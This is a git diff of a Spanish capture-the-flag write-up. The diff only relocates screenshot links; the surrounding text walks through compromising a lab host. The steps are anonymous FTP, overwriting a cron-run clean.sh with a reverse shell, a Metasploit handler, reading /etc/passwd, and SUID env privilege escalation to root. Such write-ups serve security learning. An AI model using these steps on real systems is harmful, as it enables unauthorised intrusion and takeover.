@@ -31,26 +31,26 @@ tags:
 
 `ping -c 1 10.10.41.183`
 
-![](Pasted%20image%2020250817192837.png)
+![](Screenshots/Pasted%20image%2020250817192837.png)
 
 *TTL=63/64* -> **Linux**
 ### Nmap
 
 `nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.41.183 -oG allPorts`
 
-![](Pasted%20image%2020250817192901.png)
+![](Screenshots/Pasted%20image%2020250817192901.png)
 
 `nmap -p21,22,139,445 -sCV 10.10.41.183 -oN targeted`
 
-![](Pasted%20image%2020250817192921.png)
-![](Pasted%20image%2020250817192932.png)
+![](Screenshots/Pasted%20image%2020250817192921.png)
+![](Screenshots/Pasted%20image%2020250817192932.png)
 ### FTP
 
 Se observa que el servicio **FTP** (21) se encuentra abierto y además de tener el inicio de sesión anónimo activado.
 
 `ftp 10.10.41.183`
 
-![](Pasted%20image%2020250817192955.png)
+![](Screenshots/Pasted%20image%2020250817192955.png)
 
 Se encuentra el directorio `scripts`, se accede a él para visualizar lo que contiene.
 
@@ -58,7 +58,7 @@ Se encuentra el directorio `scripts`, se accede a él para visualizar lo que con
 
 `ls`
 
-![](Pasted%20image%2020250817193009.png)
+![](Screenshots/Pasted%20image%2020250817193009.png)
 
 El archivo `clean.sh` se ejecuta de forma periódica, registrando su actividad en `removed_files.log`.
 
@@ -66,19 +66,19 @@ El archivo `clean.sh` se ejecuta de forma periódica, registrando su actividad e
 
 `cat clean.sh`
 
-![](Pasted%20image%2020250817193027.png)
+![](Screenshots/Pasted%20image%2020250817193027.png)
 
 `get removed_files.log`
 
 `cat removed_files.log`
 
-![](Pasted%20image%2020250817193040.png)
+![](Screenshots/Pasted%20image%2020250817193040.png)
 
 `get to_do.txt`
 
 `cat to_do.txt`
 
-![](Pasted%20image%2020250817193052.png)
+![](Screenshots/Pasted%20image%2020250817193052.png)
 
 Se observa que el archivo llamado `clean.sh` se ejecuta de manera periódica y pinta trazas en el archivo `removed_files.log`.
 
@@ -94,7 +94,7 @@ Se procede a modificar el script, añadiendo un *Reverse Shell*.
 
 `cat clean.sh`
 
-![](Pasted%20image%2020250817193106.png)
+![](Screenshots/Pasted%20image%2020250817193106.png)
 
 Se vuelve a acceder al servicio **FTP** y se sube el archivo modificado.
 
@@ -114,7 +114,7 @@ run
 
 `msfconsole -r handler.rc`
 
-![](Pasted%20image%2020250817193125.png)
+![](Screenshots/Pasted%20image%2020250817193125.png)
 
 Se obtiene la *Reverse Shell*.
 
@@ -126,21 +126,21 @@ Se obtiene la *Reverse Shell*.
 
 `sysinfo`
 
-![](Pasted%20image%2020250817193138.png)
+![](Screenshots/Pasted%20image%2020250817193138.png)
 
 `getuid`
 
-![](Pasted%20image%2020250817193154.png)
+![](Screenshots/Pasted%20image%2020250817193154.png)
 
 `cat /etc/passwd`
 
-![](Pasted%20image%2020250817193208.png)
+![](Screenshots/Pasted%20image%2020250817193208.png)
 
 Se accede al directorio `/home/namelessone`.
 
 `ls`
 
-![](Pasted%20image%2020250817193225.png)
+![](Screenshots/Pasted%20image%2020250817193225.png)
 
 Se encuentra la *flag* de usuario.
 ### Privilege Escalation
@@ -154,22 +154,22 @@ Se obtiene una *shell*.
 
 `find / -perm -4000 2>/dev/null`
 
-![](Pasted%20image%2020250817193253.png)
-![](Pasted%20image%2020250817193311.png)
+![](Screenshots/Pasted%20image%2020250817193253.png)
+![](Screenshots/Pasted%20image%2020250817193311.png)
 
 El binario `/usr/bin/env` con bit **SUID** permite invocar una shell como *root*, lo que facilita la escalada de privilegios según lo documentado en [GTFOBins](https://gtfobins.github.io/gtfobins/env/#suid).
 
-![](Pasted%20image%2020250817193328.png)
+![](Screenshots/Pasted%20image%2020250817193328.png)
 
 `/usr/bin/env /bin/sh -p`
 
-![](Pasted%20image%2020250817193346.png)
+![](Screenshots/Pasted%20image%2020250817193346.png)
 
 Se accede al directorio `/root`.
 
 `ls -la`
 
-![](Pasted%20image%2020250817193357.png)
+![](Screenshots/Pasted%20image%2020250817193357.png)
 
 Se encuentra la *flag* de *root*.
 
